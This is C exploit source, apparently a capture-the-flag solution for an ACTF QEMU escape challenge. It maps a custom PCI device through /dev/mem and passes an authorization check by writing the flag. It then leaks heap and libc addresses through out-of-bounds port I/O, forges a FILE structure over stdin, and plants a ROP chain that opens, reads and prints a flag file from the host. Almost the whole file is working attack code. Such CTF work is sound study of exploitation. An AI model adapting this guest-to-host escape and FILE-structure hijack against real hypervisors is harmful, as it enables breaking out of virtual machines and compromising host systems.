#include <assert.h>
#include <byteswap.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/io.h>
#include <sys/mman.h>

void err(char *msg)
{
    perror(msg);
    exit(-1);
}

void success(char *msg, uint64_t addr)
{
    printf("[\033[1;32m+\033[0m] %s = %#lx\n", msg, addr);
}

void hexdump(uint64_t *buf, uint64_t n)
{
    for (int i = 0; i < n; i++)
        if (buf[i])
            printf("%#x: %#lx\n", i, buf[i]);
}

#define PAGE_SIZE getpagesize()
#define PFN_MASK_SIZE 8

uint64_t gva_to_gpa(uint64_t addr)
{
    int fd;
    if ((fd = open("/proc/self/pagemap", O_RDONLY)) == -1)
        err("open pagemap");
    lseek(fd, addr / PAGE_SIZE * sizeof(uint64_t), SEEK_SET);
    uint64_t page;
    read(fd, &page, PFN_MASK_SIZE);
    close(fd);
    return ((page & 0x7fffffffffffff) * PAGE_SIZE) | (addr % PAGE_SIZE);
}

#define ACTF_MMIO_MAP 0xfebf1000
#define ACTF_MMIO_SIZE 0x1000
#define ACTF_PMIO_MAP 0xc040
#define ACTF_PMIO_SIZE 0x10

void *actf_map;

uint32_t mmio_read(uint32_t addr)
{
    return *(uint32_t *)&actf_map[addr];
}

void mmio_write(uint32_t addr, uint32_t val)
{
    *(uint32_t *)&actf_map[addr] = val;
}

uint32_t pmio_read(uint8_t addr)
{
    return inb(ACTF_PMIO_MAP + addr);
}

void pmio_write(uint8_t addr, uint32_t val)
{
    outb(val, ACTF_PMIO_MAP + addr);
}

void init()
{
    system("mknod -m 660 /dev/mem c 1 1");

    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0)
        err("open /dev/mem");

    if ((actf_map = mmap(NULL, ACTF_MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ACTF_MMIO_MAP)) == MAP_FAILED)
        err("mmap actf_map");
    success("actf_map", actf_map);

    if (iopl(3) < 0)
        err("iopl");
}

uint32_t pr(uint8_t addr)
{
    return pmio_read(addr + 0x10);
}

uint64_t leak(uint8_t base)
{
    uint64_t res = 0;
    for (int i = base; i < base + 8; i++)
        res += (uint64_t)pr(i) << (i * 8);
    return res;
}

void pw(uint8_t addr, uint32_t val)
{
    pmio_write(addr + 0x10, val);
}

void write64(uint64_t val)
{
    for (int j = 0; j < 8; j++)
        pw(j, *((uint8_t *)&val + j));
}

int main()
{
    init();

    printf("authorized = %d\n", pmio_read(1));
    char *flag = "ACTF{cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!}";
    for (int i = 0; i < 0x40; i += 4)
        mmio_write(i, *(uint32_t *)&flag[i]);
    pmio_write(1, 0);
    while (pmio_read(0))
        ;
    printf("authorized = %d\n", pmio_read(1));

    pw(8, 0xef);
    uint64_t addr = leak(0) & ~0xfff;
    success("addr", addr);
    // pwndbg> leakfind 0x7fff60000000 --max_offset=0x1000 --page_name=libc
    // 0x7fff60000000+0x8a0 —▸ 0x7ffff0000030+0x870 —▸ 0x7ffff6819c80 /usr/lib/x86_64-linux-gnu/libc.so.6
    mmio_write(0x40, (addr + 0x8a0) & 0xffffffff);
    addr = leak(0);
    success("addr", addr);
    mmio_write(0x40, (addr + 0x870) & 0xffffffff);
    uint64_t libc = leak(0) - 0x219c80;
    success("libc", libc);
    uint64_t _IO_2_1_stdin_ = libc + 0x219aa0;
    success("_IO_2_1_stdin_", _IO_2_1_stdin_);
    uint64_t fake_IO_wide_data_addr = libc + 0x227000;
    success("fake_IO_wide_data_addr", fake_IO_wide_data_addr);
    uint64_t _IO_wfile_jumps = libc + 0x2160c0;

    uint64_t fake_file[0x20] = {0};
    fake_file[5] = 1;
    fake_file[20] = fake_IO_wide_data_addr;
    fake_file[27] = _IO_wfile_jumps;
    for (int i = 0; i < 0xe0 / 8; i++)
    {
        mmio_write(0x40, (_IO_2_1_stdin_ + i * 8) & 0xffffffff);
        write64(fake_file[i]);
    }

    uint64_t pop_rdi_ret = libc + 0x000000000002a3e5;
    uint64_t pop_rsi_ret = libc + 0x000000000002be51;
    uint64_t pop_rdx_ret = libc + 0x00000000000796a2;
    uint64_t mov_rsp_rdx_ret = libc + 0x000000000005a120;
    success("mov_rsp_rdx_ret", mov_rsp_rdx_ret);
    uint64_t openaddr = libc + 0x1146d0;
    uint64_t readaddr = libc + 0x1149c0;
    uint64_t writeaddr = libc + 0x114a60;
    uint64_t fake_IO_wide_data[] = {
        pop_rdi_ret, fake_IO_wide_data_addr + 0x100, pop_rsi_ret, 0, openaddr,
        pop_rdi_ret, 0, pop_rsi_ret, fake_IO_wide_data_addr + 0x100, pop_rdx_ret, 0x100, readaddr,
        pop_rdi_ret, 2, pop_rsi_ret, fake_IO_wide_data_addr + 0x100, pop_rdx_ret,
        0x100, writeaddr,
        0, 0, 0, 0, 0, 0, 0, 0,
        mov_rsp_rdx_ret, fake_IO_wide_data_addr + 0x70, 0, 0, 0, *(uint32_t *)"flag"
    };
    for (int i = 0; i < 33; i++)
    {
        mmio_write(0x40, (fake_IO_wide_data_addr + i * 8) & 0xffffffff);
        write64(fake_IO_wide_data[i]);
    }

    // exit qemu

    return 0;
}
